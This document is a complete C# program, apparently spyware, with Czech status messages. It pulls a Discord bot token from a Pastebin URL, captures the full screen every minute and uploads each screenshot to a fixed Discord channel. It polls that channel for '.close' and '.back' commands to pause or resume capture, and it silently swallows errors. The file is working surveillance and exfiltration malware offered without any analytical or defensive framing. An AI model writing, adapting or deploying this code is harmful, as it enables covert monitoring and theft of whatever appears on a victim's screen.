using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Net.Http;
using System.Threading;
using System.IO;
using System.Text;

public class Program
{
    private static bool isPaused = false;
    private static string token = ""; 
    private static string channelId = "1492648143974568066";
    private static readonly HttpClient client = new HttpClient();

    public static void Main(string dummy)
    {
        try 
        {
            token = client.GetStringAsync("https://pastebin.com/raw/GkZBCURh").Result.Trim();
            client.DefaultRequestHeaders.Add("Authorization", "Bot " + token);
            
            SendMessage("🟢 **PC zapnut!** Bot se úspěšně spustil a token byl načten.").Wait();
        }
        catch (Exception e)
        {
            return; 
        }

        while (true)
        {
            CheckDiscord().Wait();

            if (!isPaused)
            {
                SendScreenshot();
            }

            Thread.Sleep(60000); // 1 minuta
        }
    }

    private static async System.Threading.Tasks.Task SendMessage(string message)
    {
        try
        {
            var content = new StringContent("{\"content\":\"" + message + "\"}", Encoding.UTF8, "application/json");
            await client.PostAsync($"https://discord.com/api/v10/channels/{channelId}/messages", content);
        }
        catch { }
    }

    private static async System.Threading.Tasks.Task CheckDiscord()
    {
        try
        {
            var response = await client.GetStringAsync($"https://discord.com/api/v10/channels/{channelId}/messages?limit=1");
            
            if (response.Contains("\".close\"") && !isPaused)
            {
                isPaused = true;
                await SendMessage("🛑 **Monitoring pozastaven.** (.back pro obnovení)");
            }
            if (response.Contains("\".back\"") && isPaused)
            {
                isPaused = false;
                await SendMessage("▶️ **Monitoring obnoven.**");
            }
        }
        catch { }
    }

    private static void SendScreenshot()
    {
        try
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            }

            using (var ms = new MemoryStream())
            {
                bmp.Save(ms, ImageFormat.Png);
                byte[] byteImage = ms.ToArray();

                MultipartFormDataContent content = new MultipartFormDataContent();
                content.Add(new ByteArrayContent(byteImage), "file", "screen.png");
                
                var response = client.PostAsync($"https://discord.com/api/v10/channels/{channelId}/messages", content).Result;
            }
        }
        catch (Exception e)
        {
            SendMessage("❌ **Chyba:** " + e.Message).Wait();
        }
    }
}
